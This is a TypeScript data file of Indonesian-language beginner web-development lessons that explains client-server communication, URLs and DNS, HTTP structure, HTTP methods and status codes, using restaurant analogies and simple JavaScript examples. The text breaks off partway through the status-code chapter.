// @ts-nocheck

export interface Chapter {

  id: string;

  moduleId: number;

  chapterNum: string;

  title: string;

  subtitle: string;

  level: string;

  objectives: string[];

  analogy: { diagram: string; caption: string };

  explanation: string;

  codeExample?: { language: string; code: string };

  explainAlong?: string;

  aiPrompt: string;

  reflection: string;

}



// ============================================================

// MODUL 1: Dasar Internet & HTTP (6 chapters)

// ============================================================

const modul1: Chapter[] = [

  {

    id: "1.1",

    moduleId: 1,

    chapterNum: "1.1",

    title: "Apa Itu Web? Client dan Server",

    subtitle: "Peran klien dan server, model request-response",

    level: "Pemula",

    objectives: [

      "Memahami peran client (browser) dan server dalam komunikasi web",

      "Mengerti alur request-response menggunakan analogi yang tepat",

    ],

    analogy: {

      diagram: "+------------------+       Request         +------------------+\n|   Kamu (Browser) | --------------------> | Restoran (Server)|\n|   - Pelanggan    |    \"Mau pesan       |   - Dapur          |\n|   - Pesan makan  |     nasi goreng\"    |   - Masak          |\n|   - Tunggu       |                      |   - Sajikan        |\n+------------------+ <-------------------- +------------------+\n                         Response\n                   \"Ini nasi gorengnya\"\n\nAnaloginya simple:\n- Browser = Kamu sebagai pelanggan di restoran\n- Server = Dapur restoran\n- Request = Pesanan kamu ke pelayan\n- Response = Makanan yang dibawakan pelayan",

      caption: "Analogi Restoran: Browser = pelanggan, Server = dapur, Request/Response = pesanan dan makanan",

    },

    explanation: "Kalau kamu baru mulai belajar web development, pasti sering dengar istilah **client** dan **server**. Kedua kata ini muncul di hampir setiap tutorial, setiap dokumentasi, dan setiap pembicaraan tentang teknologi web. Tapi sebenarnya apa sih artinya? Kenapa konsep ini begitu penting dipahami sebelum kita menulis satu baris kode pun?\n\nMari kita bedah perlahan dari nol.\\n\\n**Bayangkan kamu masuk ke restoran favoritmu.** Kamu duduk di meja, buka menu, lalu panggil pelayan untuk pesan makanan. Kamu bilang, \\\"Mas, pesan nasi goreng spesial satu ya, tambah telur, pedas.\\\" Pelayan mencatat pesanan kamu dengan cermat, bawa ke dapur. Koki di dapur baca catatan, siapkan bahan-bahan, masak nasi goreng sesuai pesananmu. Setelah matang dan disajikan dengan rapi, pelayan bawakan ke meja kamu.\n\nKamu terima makanan, lalu makan dengan lahap.\\n\\nNah, di dunia web, prosesnya **sama persis** seperti itu. Cuma bedanya kita nggak bisa lihat dan sentuh secara fisik, tapi logikanya identik.\\n\\n**Client (Browser) = Kamu sebagai pelanggan.** Client itu adalah software yang kamu pakai untuk mengakses internet. Paling umum adalah web browser seperti Google Chrome, Mozilla Firefox, Safari, atau Microsoft Edge. Tugas client cuma satu: minta data ke server.\n\nCaranya? Kamu ketik alamat website di address bar, tekan Enter, dan browser akan mengirimkan permintaan. Permintaan itu disebut **request**. Tapi client bukan cuma browser lho.\n\nAplikasi mobile seperti Instagram atau Twitter di HP-mu juga adalah client. Aplikasi desktop seperti Spotify atau VS Code saat terhubung internet juga client. Bahkan smart TV kamu yang nonton Netflix juga client! Jadi **client adalah perangkat atau software yang meminta layanan atau data.**\\n\\n**Server = Dapur restoran.** Server adalah komputer khusus yang nyala 24 jam nonstop — bahkan saat kamu tidur.\n\nDi dalam server ada file-file website (HTML, CSS, JavaScript), gambar, video, database, dan program-program yang berjalan di belakang layar.\n\nTugas server adalah menerima request dari client, memprosesnya, lalu mengirimkan jawaban.\n\nJawaban itu disebut **response**.\n\nServer bisa berupa komputer fisik yang berdiri di data center raksasa, atau bisa juga virtual server di cloud seperti AWS, Google Cloud, atau DigitalOcean.\\n\\n**Request = Pesanan kamu ke pelayan.** Ketika kamu ketik \\\"google.com\\\" di browser dan tekan Enter,\n\nBrowser membuat pesan kecil yang isinya: \\\"Halo server Google, tolong kirimkan halaman utama Google.com ya.\\\" Pesan ini berjalan melalui internet, melewati berbagai jaringan kabel dan router, sampai ke server Google.\n\nRequest ini bisa berupa permintaan halaman HTML, file gambar, data dari API,\n\nAtau apa pun yang dibutuhkan untuk menampilkan website.\\n\\n**Response = Makanan yang dibawakan pelayan.** Server Google menerima request-mu, mencari file yang diminta, lalu mengirimkan kembali ke browser-mu.\n\nResponse ini biasanya berupa file HTML yang berisi struktur halaman, ditambah CSS untuk tampilannya, dan JavaScript untuk interaktivitasnya.\n\nBrowser menerima response ini, memprosesnya, lalu menampilkannya di layar kamu sebagai halaman web yang indah dan interaktif.\\n\\n**Jadi alur lengkapnya seperti ini:**\\n1.\n\n**Kamu membuka browser** dan ketik alamat website → browser membuat **request**.\\n2.\n\n**Request berjalan melalui internet** (melewati DNS, router, firewall) → sampai ke **server**.\\n3.\n\n**Server menerima dan memproses request** → mencari file atau data yang diminta → membuat **response**.\\n4.\n\n**Response kembali ke browser-mu** melalui internet.\\n5.\n\n**Browser menerima response** → mem-parse HTML, CSS, JavaScript → menampilkan halaman di layar.\\n\\nSekarang,\n\nAda satu hal penting yang harus kamu pahami: **client dan server itu bukan benda fisik yang tetap.** Mereka adalah **peran.** Sebuah komputer bisa berperan sebagai server kalau dia menjalankan software server seperti Apache, Nginx, atau Node.js.\n\nDan komputer server yang sama juga bisa berperan sebagai client kalau dia mengakses website lain. Bahkan laptop kamu sekarang ini bisa jadi server kalau kamu install software server dan mengkonfigurasinya dengan benar!\\n\\n**Kenapa konsep ini penting?** Karena seluruh web dibangun di atas model ini. Setiap kali kamu buka Instagram, nonton YouTube, atau belanja di Tokopedia, yang terjadi adalah jutaan request-response antara client dan server. Memahami model ini adalah fondasi dari segala sesuatu yang akan kamu pelajari selanjutnya — HTML, CSS, JavaScript, API, database, framework, semuanya beroperasi di dalam konteks client-server.\n\nTanpa pemahaman ini, kode yang kamu tulis akan terasa seperti mantra yang dihafal tanpa mengerti artinya.\\n\\nJadi, selamat! Kamu baru saja memahami fondasi paling fundamental dari dunia web. Setiap kali kamu browsing ke depannya, ingatlah: kamu adalah client yang sedang memesan makanan di restoran server. Selamat berselancar!",

    codeExample: {

      language: "javascript",

      code: "// Simulasi alur Client-Server dengan fetch API\n// (Ini kode di browser/client side)\n\nasync function pesanKeServer() {\n  // Client kirim REQUEST ke server\n  console.log(\"[CLIENT] Kirim pesanan...\");\n  \n  try {\n    const response = await fetch('https://api.example.com/menu');\n    \n    // Server kirim RESPONSE balik\n    const data = await response.json();\n    console.log(\"[CLIENT] Terima response:\", data);\n    \n    // Browser tampilkan ke user\n    document.body.innerHTML = `\n      <h1>${data.namaRestoran}</h1>\n      <ul>\n        ${data.menu.map(item => `\n          <li>${item.nama} - Rp${item.harga}</li>\n        `).join('')}\n      </ul>\n    `;\n  } catch (error) {\n    console.error(\"[CLIENT] Server error:\", error);\n  }\n}\n\npesanKeServer();",

    },

    explainAlong: "Baris 5: Client kirim request dengan fetch(). Baris 8: Server memproses dan kirim response. Baris 11-17: Browser render response ke HTML yang bisa dilihat user.",

    aiPrompt: "Jelaskan perbedaan antara client dan server menggunakan analogi yang berbeda dari restoran. Berikan 3 contoh client selain web browser yang kamu gunakan setiap hari.",

    reflection: "Coba buka Chrome DevTools (tekan F12) → tab Network → refresh halaman ini. Kamu akan melihat semua request yang browser kirim. Identifikasi mana yang request HTML, mana yang request gambar, dan mana yang request API data.",

  },

  {

    id: "1.2",

    moduleId: 1,

    chapterNum: "1.2",

    title: "Alamat di Web: URL dan DNS",

    subtitle: "Struktur URL, fungsi DNS menerjemahkan domain ke IP",

    level: "Pemula",

    objectives: [

      "Memahami struktur URL dan cara membacanya",

      "Mengerti fungsi DNS seperti buku telepon internet",

    ],

    analogy: {

      diagram: "+-----------------------------------------------------------+\n|  https://www.google.com/search?q=javascript               |\n+-----------------------------------------------------------+\n   |       |         |         |          |\n   |       |         |         |          +-- Query\n   |       |         |         +------------- Path\n   |       |         +----------------------- Domain\n   |       +--------------------------------- Subdomain\n   +----------------------------------------- Protocol\n\nAnalogi Buku Telepon:\n- Nama kontak: \"Google\" (domain)\n- Nomor telepon: 172.217.0.46 (IP address)\n- DNS = Buku telepon yang terjemahkan nama ke nomor",

      caption: "Analogi Buku Telepon: DNS menerjemahkan nama domain ke IP address",

    },

    explanation: "Pernah nggak kamu bertanya-tanya, gimana sih cara browser tahu harus ke mana kalau kamu ketik \\\"google.com\\\"? Di balik layar, prosesnya jauh lebih menarik daripada yang kamu kira. Bayangkan kalau setiap kali kamu mau hubungi teman, kamu harus ingat nomor telepon lengkap mereka — ribet kan? Makanya ada buku telepon yang menerjemahkan nama jadi nomor.\n\nNah, di internet, sistem yang sama persis bernama DNS.\n\nTapi sebelum kita bahas DNS, mari kita pahami dulu apa itu URL.\\n\\n**URL (Uniform Resource Locator)** itu adalah alamat lengkap sebuah resource di internet. \\\"Resource\\\" di sini bisa berupa halaman web,\n\nGambar, video, file PDF, atau apa pun yang bisa diakses secara online.\n\nURL itu seperti alamat rumah — unik, spesifik, dan kalau kamu punya alamatnya, kamu bisa menemukan rumah tersebut.\\n\\nMari kita bedah URL `https://www.google.com/search?q=javascript` bersama-sama.\n\nSetiap bagian punya nama dan fungsi masing-masing:\\n\\n**1.\n\nProtocol (`https://`)** — Ini adalah aturan komunikasi. Bayangkan protocol seperti bahasa yang dipakai. Kalau kamu dan teman bicara pakai bahasa Indonesia, itu adalah \\\"protocol\\\" komunikasi kalian. Di web, protocol menentukan bagaimana data dikirim.\n\n`https` berarti data dienkripsi dan aman (ada gembok di browser). `http` tanpa \\\"s\\\" berarti data dikirim tanpa enkripsi — jadi jangan pernah masukkan password di website HTTP! Ada juga protocol lain seperti `ftp` untuk transfer file, `ws` untuk WebSocket, dan `mailto` untuk email.\\n\\n**2. Subdomain (`www`)** — Ini adalah bagian depan domain.\n\nFungsinya untuk mengelompokkan layanan. `www` berarti website utama. Tapi coba perhatikan: `mail.google.com` untuk Gmail, `drive.google.com` untuk Google Drive, `docs.google.com` untuk Google Docs — semuanya subdomain dari google.com! Subdomain membantu sebuah perusahaan mengelola banyak layanan berbeda di bawah satu domain utama.\\n\\n**3.\n\nDomain (`google.com`)** — Ini adalah nama website yang unik secara global. Tidak ada dua website yang punya domain persis sama. Domain terdiri dari nama (`google`) dan ekstensi (`.com`). Ekstensi ada banyak jenisnya: `.com` untuk komersial, `.org` untuk organisasi, `.id` untuk Indonesia, `.co.uk` untuk UK, dan seterusnya.\n\nDomain dibeli dari registrar seperti Namecheap, GoDaddy, atau Niaga Hoster, dan harus diperpanjang setiap tahun.\\n\\n**4. Path (`/search`)** — Ini adalah lokasi spesifik di dalam server. Sama seperti di komputer kamu ada folder dan file, server juga punya struktur direktori. Path `/search` berarti \\\"cari file atau program yang menangani pencarian.\\\" Path bisa bertingkat, seperti `/blog/2024/januari/artikel-saya.html`.\\n\\n**5.\n\nQuery (`?q=javascript`)** — Ini adalah data tambahan yang dikirim ke server.\n\nQuery selalu dimulai dengan tanda tanya (`?`) dan formatnya `key=value`.\n\nBisa lebih dari satu, dipisah dengan `&`, seperti `?q=javascript&lang=id&page=1`.\n\nServer membaca query ini untuk menyesuaikan responsenya — dalam contoh ini, Google akan mencari kata \\\"javascript.\\\"\\n\\n**Sekarang,\n\nMari kita bahas DNS (Domain Name System).** Ketika kamu ketik \\\"google.com\\\", browser nggak langsung tahu ke mana harus pergi.\n\nBrowser butuh **IP address** — serangkaian angka seperti `142.250.185.78` — yang menjadi identitas unik setiap komputer di internet. DNS adalah sistem terdistribusi raksasa (seperti ribuan buku telepon yang saling terhubung) yang menerjemahkan nama domain menjadi IP address.\\n\\n**Prosesnya terjadi dalam milidetik:**\\n1. Kamu ketik \\\"google.com\\\" → browser cek cache-nya sendiri (pernah buka Google sebelumnya?).\\n2. Kalau tidak ada, tanya ke sistem operasi → cek cache OS.\\n3.\n\nKalau masih tidak ada, tanya ke **DNS Resolver** (biasanya ISP-mu seperti Telkomsel atau IndiHome).\\n4. DNS Resolver tanya ke **Root Server** (ada 13 root server di dunia!).\\n5. Root Server arahkan ke **TLD Server** yang menangani `.com`.\\n6. TLD Server arahkan ke **Authoritative Server** Google.\\n7.\n\nAuthoritative Server jawab: \\\"google.com = 142.250.185.78\\\"\\n8. Browser sekarang tahu IP-nya dan kirim request ke sana!\\n\\n**Kenapa nggak langsung pakai IP address aja?** Bisa sih! Coba ketik `142.250.185.78` di browser, bakal muncul Google juga. Tapi coba bayangin kalau kamu harus hafal puluhan angka IP untuk setiap website yang kamu kunjungi setiap hari.\n\nRibet kan? Makanya domain name diciptakan — supaya manusia bisa mengingat alamat dengan mudah. DNS adalah jembatan antara bahasa manusia (nama) dan bahasa mesin (angka IP).",

    codeExample: {

      language: "javascript",

      code: "// Contoh parsing URL di JavaScript\nconst url = new URL('https://www.google.com/search?q=javascript&lang=id');\n\nconsole.log(url.protocol);  // \"https:\"\nconsole.log(url.hostname);  // \"www.google.com\"\nconsole.log(url.pathname);  // \"/search\"\nconsole.log(url.search);    // \"?q=javascript&lang=id\"\nconsole.log(url.searchParams.get('q'));     // \"javascript\"\nconsole.log(url.searchParams.get('lang'));  // \"id\"\n\n// DNS lookup dengan Node.js\n// const dns = require('dns');\n// dns.lookup('google.com', (err, address) => {\n//   console.log('IP address:', address);  // \"142.250.185.78\"\n// });",

    },

    explainAlong: "Baris 2: Buat objek URL dari string. Baris 4-8: Akses setiap bagian URL. Baris 10-11: Ambil query parameter tertentu. Baris 13-15: DNS lookup di Node.js (commented).",

    aiPrompt: "Jelaskan kenapa DNS diibaratkan seperti buku telepon. Apa yang terjadi kalau DNS server tidak tersedia? Bagaimana cara kerja DNS cache di browser?",

    reflection: "Coba buka command prompt dan jalankan perintah `nslookup google.com`. IP address yang kamu dapatkan mungkin berbeda dari contoh di atas. Kenapa bisa beda? Apa itu CDN dan bagaimana hubungannya dengan DNS?",

  },

  {

    id: "1.3",

    moduleId: 1,

    chapterNum: "1.3",

    title: "Perjalanan Request: HTTP dari A ke Z",

    subtitle: "Struktur HTTP request dan response",

    level: "Pemula",

    objectives: [

      "Memahami struktur HTTP request dan response",

      "Mengerti header, body, dan method dalam HTTP",

    ],

    analogy: {

      diagram: "+------------------+     HTTP Request      +------------------+\n|   Kamu (Browser) | --------------------> |   Server         |\n|   GET /menu      |                      |   Proses...      |\n|   Host: google   |                      |                  |\n|   Accept: html   |                      |                  |\n+------------------+ <-------------------- +------------------+\n                      HTTP Response\n                      200 OK\n                      Content-Type: text/html\n                      <html>...</html>",

      caption: "HTTP Request = surat pesanan, HTTP Response = surat balasan dengan barangnya",

    },

    explanation: "HTTP itu singkatan dari **HyperText Transfer Protocol**. Protokol = aturan main. Jadi HTTP adalah aturan main bagaimana browser dan server berkomunikasi. Tanpa HTTP, internet nggak akan bisa berfungsi seperti yang kita kenal sekarang.\n\nSetiap kali kamu buka website, unduh gambar, kirim form,\n\nAtau nonton video online — semuanya menggunakan HTTP sebagai fondasi komunikasinya.\\n\\n**Analoginya kayak kirim surat pesanan.** Bayangkan kamu mau beli buku dari toko online.\n\nKamu tulis surat yang isinya: \\\"Halo, saya mau beli buku JavaScript untuk Pemula, dikirim ke alamat Jl.\n\nMawar No. 5.\\\" Surat ini adalah **HTTP Request**.\n\nLalu toko online balas dengan surat lain: \\\"Pesanan diterima, buku akan dikirim besok.\\\" Surat balasan ini adalah **HTTP Response**.\n\nSimple kan?\n\nTapi di dalam \\\"surat\\\" tersebut, ada struktur yang sangat terorganisir.\\n\\n**HTTP Request terdiri dari 3 bagian utama:**\\n\\n**1.\n\nRequest Line (Baris Pertama)** — Ini adalah baris paling penting yang berisi 3 informasi:\\n   - **Method**: Apa yang mau kamu lakukan? (GET, POST, PUT, DELETE,\n\nDll)\\n   - **Path**: Lokasi resource yang diminta (misalnya `/users/123`)\\n   - **Version**: Versi HTTP yang dipakai (HTTP/1.1 atau HTTP/2)\\n   Contoh: `GET /search?q=javascript HTTP/1.1`\\n   Artinya: \\\"Saya mau AMBIL data dari path /search dengan query javascript, pakai HTTP versi 1.1.\\\"\\n\\n**2.\n\nHeaders (Kepala Surat)** — Headers adalah informasi tambahan yang membantu server memahami request-mu.\n\nIni seperti metadata — data tentang data. Beberapa header penting:\\n   - `Host`: Menyebutkan domain tujuan (contoh: `Host: google.com`)\\n   - `Accept`: Memberitahu server format apa yang client bisa terima (`Accept: text/html`)\\n   - `User-Agent`: Identitas browser dan sistem operasi kamu\\n   - `Authorization`: Token atau kredensial untuk akses terproteksi\\n   - `Content-Type`: Format data yang dikirim (untuk POST/PUT)\\n   Headers ini penting karena server membutuhkan konteks untuk memproses request dengan benar.\\n\\n**3. Body (Isi Surat, Opsional)** — Body hanya ada untuk method tertentu seperti POST dan PUT. Ini adalah data sebenarnya yang ingin kamu kirim ke server.\n\nMisalnya kalau kamu mengisi form registrasi, data nama, email, dan password akan ada di body.\n\nBody bisa berupa JSON, form data, XML, atau bahkan file upload.\\n\\n**HTTP Response juga terdiri dari 3 bagian yang mirip:**\\n\\n**1.\n\nStatus Line** — Berisi versi HTTP, status code (3 digit), dan status message.\\n   Contoh: `HTTP/1.1 200 OK`\\n   Artinya: \\\"HTTP versi 1.1,\n\nRequest berhasil (200), semua baik (OK).\\\"\\n   Status code ini sangat penting untuk mengetahui hasil request.\n\nAda ratusan status code yang dikelompokkan dalam 5 kategori (kita bahas di chapter berikutnya).\\n\\n**2.\n\nResponse Headers** — Sama seperti request headers, tapi informasinya tentang response.\\n   - `Content-Type`: Format data yang dikirim (`text/html`, `application/json`,\n\n`image/png`)\\n   - `Content-Length`: Ukuran data dalam byte\\n   - `Cache-Control`: Instruksi caching\\n   - `Set-Cookie`: Cookie yang diset server untuk browser\\n\\n**3.\n\nResponse Body** — Ini isi sebenarnya yang diminta.\n\nKalau kamu buka website, body berisi HTML.\n\nKalau kamu akses API, body berisi JSON.\n\nKalau kamu buka gambar, body berisi data binary gambar tersebut.\\n\\n**Kenapa struktur ini penting?** Karena setiap bagian punya peran spesifik.\n\nRequest line memberitahu \\\"apa yang mau dilakukan,\\\" headers memberikan \\\"konteks dan metadata,\\\" dan body membawa \\\"data sebenarnya.\\\" Memahami struktur ini membantumu debug saat terjadi error — misalnya status 404 berarti resource tidak ditemukan,\n\nAtau header `Content-Type` yang salah bisa membuat browser tidak bisa menampilkan halaman dengan benar.\\n\\n**HTTP/2 dan HTTP/3** — Versi terbaru HTTP membuat web lebih cepat dengan multiplexing (banyak request sekaligus dalam satu koneksi), server push, dan kompresi header.\n\nTapi konsep dasar request-response tetap sama.\n\nYang berubah adalah efisiensi pengiriman datanya.\\n\\nJadi, setiap kali kamu browsing, ingatlah: kamu sedang menulis dan menerima \\\"surat elektronik\\\" yang sangat terstruktur.\n\nMemahami isi surat tersebut akan membuatmu developer yang jauh lebih baik.",

    codeExample: {

      language: "http",

      code: "# === HTTP REQUEST ===\nGET /api/users/123 HTTP/1.1\nHost: api.example.com\nAccept: application/json\nAuthorization: Bearer eyJhbGci...\nUser-Agent: Mozilla/5.0...\n\n# === HTTP RESPONSE ===\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 87\nCache-Control: max-age=3600\n\n{\n  \"id\": 123,\n  \"nama\": \"Budi\",\n  \"email\": \"budi@example.com\"\n}\n\n# === Lihat request di Browser DevTools ===\n# 1. Buka halaman apa pun\n# 2. Tekan F12 → tab Network\n# 3. Refresh halaman\n# 4. Klik salah satu request → lihat Headers, Preview, Response",

    },

    explainAlong: "Baris 1-5: HTTP Request dengan method GET dan headers. Baris 7-14: HTTP Response dengan status 200 OK dan body JSON. Baris 16-20: Cara melihat HTTP request/response di browser DevTools.",

    aiPrompt: "Jelaskan perbedaan method GET dan POST menggunakan analogi restoran. Kapan sebaiknya menggunakan PUT vs PATCH?",

    reflection: "Buka DevTools (F12) → Network → refresh halaman. Pilih request pertama, lalu lihat tab Headers. Ada berapa header yang dikirim? Apa fungsi header 'User-Agent' dan 'Accept'?",

  },

  {

    id: "1.4",

    moduleId: 1,

    chapterNum: "1.4",

    title: "Metode HTTP: GET, POST, PUT, DELETE",

    subtitle: "Perbedaan method HTTP dan kapan menggunakannya",

    level: "Pemula",

    objectives: [

      "Memahami perbedaan 5 method HTTP utama",

      "Bisa memilih method yang tepat untuk setiap operasi",

    ],

    analogy: {

      diagram: "RESTful API = Menu Restoran:\n\n+-------------+----------------+------------------+\n| Method      | Operasi        | Analogi Restoran |\n+-------------+----------------+------------------+\n| GET         | Baca data      | Lihat menu       |\n| POST        | Tambah data    | Pesan makanan    |\n| PUT         | Ganti semua    | Ganti pesanan    |\n| PATCH       | Ganti sebagian | Tambah topping   |\n| DELETE      | Hapus data     | Batalkan pesanan |\n+-------------+----------------+------------------+",

      caption: "Setiap method HTTP punya 'peran' seperti aksi di restoran",

    },

    explanation: "Di chapter sebelumnya kita sudah kenalan dengan HTTP dan strukturnya. Sekarang kita akan bedah satu per satu **method HTTP** — yaitu kata kerja yang dipakai untuk memberi tahu server apa yang mau kita lakukan. Method ini adalah inti dari komunikasi web karena setiap request harus punya method. Tanpa method, server nggak akan tahu harus ngapain dengan request-mu.\\n\\n**Analoginya gini:** restoran punya aturan — kalau kamu bilang \\\"lihat\\\" berarti kamu cuma mau lihat menu.\n\nKalau bilang \\\"pesan\\\" berarti kamu mau order. Kalau bilang \\\"ganti\\\" berarti pesanan lama diganti. Kalau bilang \\\"batal\\\" berarti pesanan dicancel. Method HTTP bekerja dengan cara yang sama persis — mereka adalah \\\"kata kerja\\\" yang memberitahu server tindakan apa yang harus dilakukan.\\n\\n**GET — Lihat Data (Read)**\\nMethod GET dipakai untuk **meminta data** dari server.\n\nData ini tidak diubah, tidak dihapus — cuma dibaca.\n\nIni adalah method yang paling sering kamu pakai, meskipun kamu nggak sadar.\n\nSetiap kali kamu buka website, browser kirim GET request untuk mengambil halaman HTML, CSS, gambar, dan semua resource yang dibutuhkan.\\n\\nKarakteristik GET:\\n- Data dikirim lewat URL dalam bentuk query parameter (`?key=value`)\\n- Bisa di-bookmark (karena semua info ada di URL)\\n- Bisa di-cache oleh browser\\n- Bisa di-refresh tanpa masalah\\n- **Jangan pernah pakai GET untuk operasi yang mengubah data!** Misalnya jangan buat link `GET /hapus-user?id=123` karena kalau search engine crawl atau orang refresh halaman,\n\nUser bisa terhapus!\\n\\nContoh penggunaan GET:\\n- `GET /users` → ambil daftar semua user\\n- `GET /users/123` → ambil detail user dengan ID 123\\n- `GET /products?category=elektronik&sort=harga` → filter dan sorting\\n\\n**POST — Tambah Data (Create)**\\nMethod POST dipakai untuk **mengirim data baru** ke server.\n\nKetika kamu daftar akun baru, kirim komentar, atau upload foto — semuanya menggunakan POST.\n\nData dikirim melalui body request, bukan URL,\n\nLebih aman untuk data sensitif dan bisa menampung ukuran yang lebih besar.\\n\\nKarakteristik POST:\\n- Data dikirim lewat body request (bukan URL)\\n- Tidak bisa di-bookmark\\n- Tidak di-cache browser\\n- Data berubah di server (create new resource)\\n- Setiap kali dipanggil, biasanya membuat data baru (tidak idempoten)\\n\\nContoh penggunaan POST:\\n- `POST /users` → daftarkan user baru\\n- `POST /orders` → buat pesanan baru\\n- `POST /login` → kirim kredensial untuk autentikasi\\n\\n**PUT — Ganti Seluruh Data (Full Update)**\\nMethod PUT dipakai untuk **mengganti seluruh data** yang sudah ada dengan data baru.\n\nBayangkan kamu punya profil dengan nama, email, alamat, dan nomor telepon.\n\nKalau kamu pakai PUT, kamu harus kirim SEMUA field tersebut — meskipun cuma satu field yang berubah.\n\nKalau ada field yang tidak kamu kirim, biasanya akan di-set ke nilai default atau null.\\n\\nKarakteristik PUT:\\n- Idempoten — memanggil 1x atau 100x hasilnya sama\\n- Mengganti seluruh resource dengan data baru\\n- Memerlukan semua field resource\\n\\n**PATCH — Ganti Sebagian Data (Partial Update)**\\nMethod PATCH dipakai untuk **mengganti sebagian data** saja.\n\nIni seperti edit profil — kalau kamu cuma mau ganti email, kamu kirim hanya field email. Field lainnya tidak berubah. PATCH lebih efisien daripada PUT untuk update kecil.\\n\\n**DELETE — Hapus Data**\\nMethod DELETE dipakai untuk **menghapus data**. Simple dan langsung.\\n\\n**Konsep Idempoten** ini penting: GET, PUT, dan DELETE adalah idempoten — artinya memanggilnya berkali-kali hasilnya sama.\n\nTapi POST tidak idempoten — memanggil POST 3x berarti membuat 3 data baru. Ini adalah konsep fundamental dalam desain API yang harus selalu diingat.",

    codeExample: {

      language: "javascript",

      code: "// ====== GET: Ambil data ======\nconst getUsers = async () => {\n  const res = await fetch('/api/users');\n  const users = await res.json();\n  console.log('Daftar user:', users);\n};\n\n// ====== POST: Tambah data ======\nconst createUser = async (nama, email) => {\n  const res = await fetch('/api/users', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ nama, email })\n  });\n  const newUser = await res.json();\n  console.log('User baru:', newUser);\n};\n\n// ====== PUT: Ganti semua data ======\nconst updateUser = async (id, nama, email) => {\n  const res = await fetch(`/api/users/${id}`, {\n    method: 'PUT',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ nama, email, umur: 25, kota: 'Jakarta' })\n  });\n  return res.json();\n};\n\n// ====== PATCH: Ganti sebagian ======\nconst patchUser = async (id, emailBaru) => {\n  const res = await fetch(`/api/users/${id}`, {\n    method: 'PATCH',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ email: emailBaru })  // cuma email yang diubah\n  });\n  return res.json();\n};\n\n// ====== DELETE: Hapus data ======\nconst deleteUser = async (id) => {\n  const res = await fetch(`/api/users/${id}`, {\n    method: 'DELETE'\n  });\n  console.log('User dihapus:', res.status === 204);\n};",

    },

    explainAlong: "Baris 2-4: GET request sederhana tanpa body. Baris 8-15: POST dengan body JSON untuk membuat data baru. Baris 18-25: PUT mengganti seluruh field data. Baris 28-35: PATCH hanya mengganti field yang dikirim. Baris 38-43: DELETE tanpa body.",

    aiPrompt: "Bandingkan method PUT dan PATCH. Kapan sebaiknya menggunakan masing-masing? Berikan contoh kasus di dunia nyata.",

    reflection: "API mana yang lebih aman: GET /delete-user?id=123 atau DELETE /users/123? Kenapa? Mengapa GET request tidak seharusnya mengubah data?",

  },

  {

    id: "1.5",

    moduleId: 1,

    chapterNum: "1.5",

    title: "Status Code: Apa Artinya 404, 500, dan Lainnya?",

    subtitle: "Kategori status code 1xx, 2xx, 3xx, 4xx, 5xx",

    level: "Pemula",

    objectives: [

      "Memahami kategori status code HTTP",

      "Bisa membaca dan men-debug error berdasarkan status code",

    ],

    analogy: {

      diagram: "Status Code = Kode Respon Restoran:\n\n+------+---------------------------+\n| Kode | Arti                      |\n+------+---------------------------+\n| 2xx  | \"Pesanan berhasil!\"       |\n| 3xx  | \"Pindah ke meja lain\"     |\n| 4xx  | \"Salah pesanan (kamu)\"    |\n| 5xx  | \"Dapur masalah (server)\"  |\n+------+---------------------------+",

      caption: "Status code memberi tahu hasil request: sukses, redirect, error client, atau error server",

    },

    explanation: "Kalau kamu pernah lihat halaman \\\"404 Not Found\\\" atau \\\"500 Internal Server Error\\\", itu adalah **status code HTTP**.\n\nStatus code adalah 3 digit angka yang dikirim server untuk memberi tahu browser: \\\"Request kamu itu hasilnya gimana?\\\" Status code adalah cara server berkomunikasi tanpa harus menulis kalimat panjang. 3 digit angka ini menghemat bandwidth dan sudah menjadi standar universal sejak tahun 1990-an.\\n\\n**Analoginya kayak respon pelayan restoran:**\\n- \\\"200 OK\\\" = \\\"Pesanan berhasil,\n\nIni makanannya!\\\"\\n- \\\"301 Moved\\\" = \\\"Restoran pindah ke alamat baru, silakan ke sana.\\\"\\n- \\\"400 Bad Request\\\" = \\\"Maaf, pesanan kamu nggak jelas.\n\nCoba ulang.\\\"\\n- \\\"401 Unauthorized\\\" = \\\"Maaf, ini khusus member.\n\nSilakan login dulu.\\\"\\n- \\\"403 Forbidden\\\" = \\\"Maaf, meskipun kamu sudah login, kamu tidak punya izin akses ini.\\\"\\n- \\\"404 Not Found\\\" = \\\"Maaf, menu yang kamu pesan nggak ada di daftar kami.\\\"\\n- \\\"500 Internal Server Error\\\" = \\\"Dapur kami ada masalah teknis,\n\nMohon maaf dan tunggu sebentar.\\\"\\n\\n**Kategori Status Code:**\\n\\n**1xx — Informational (Informasi)**\\nJarang kamu lihat karena ini cuma informasi bahwa request diterima dan sedang diproses.\n\nServer bilang \\\"Oke, saya terima suratmu, tunggu ya.\\\" Kamu nggak akan melihat ini di browser karena prosesnya terlalu cepat.\\nContoh: 100 Continue, 101 Switching Protocols\\n\\n**2xx — Success (Sukses)**\\nRequest berhasil! Server berhasil memproses apa yang kamu minta. Ini adalah hasil yang paling kamu harapkan.\\n- **200 OK** → Request berhasil, ini datanya. Ini adalah status code paling umum.\\n- **201 Created** → Data baru berhasil dibuat (biasanya respons dari POST request).\\n- **204 No Content** → Request berhasil diproses, tapi tidak ada data yang dikembalikan.\n\nBiasa dipakai untuk DELETE.\\n\\n**3xx — Redirection (Pengalihan)**\\nServer bilang: \\\"Bukan di sini,\n\nCoba ke alamat lain.\\\" Ini seperti pindah meja di restoran — kamu diarahkan ke lokasi baru.\\n- **301 Moved Permanently** → URL sudah pindah selamanya.\n\nBrowser akan mengingat ini dan langsung ke alamat baru ke depannya.\n\nPenting untuk SEO!\\n- **302 Found** → URL pindah sementara.\n\nBrowser tetap akan mengingat URL asli.\\n- **304 Not Modified** → Data tidak berubah sejak terakhir diakses, pakai versi cache saja.\n\nIni mempercepat browsing!\\n\\n**4xx — Client Error (Salah dari Client/Kamu)**\\nAda yang salah dari sisi kamu atau aplikasi client. Server nggak bisa memenuhi request karena ada masalah dengan request yang dikirim.\\n- **400 Bad Request** → Request tidak valid. Mungkin JSON yang dikirim rusak atau parameter kurang.\\n- **401 Unauthorized** → Harus login dulu. Kamu belum memberikan kredensial yang valid.\\n- **403 Forbidden** → Sudah login, tapi tidak punya izin akses.\n\nKamu terautentikasi tapi tidak terotorisasi.\\n- **404 Not Found** → Resource yang diminta tidak ditemukan. URL salah 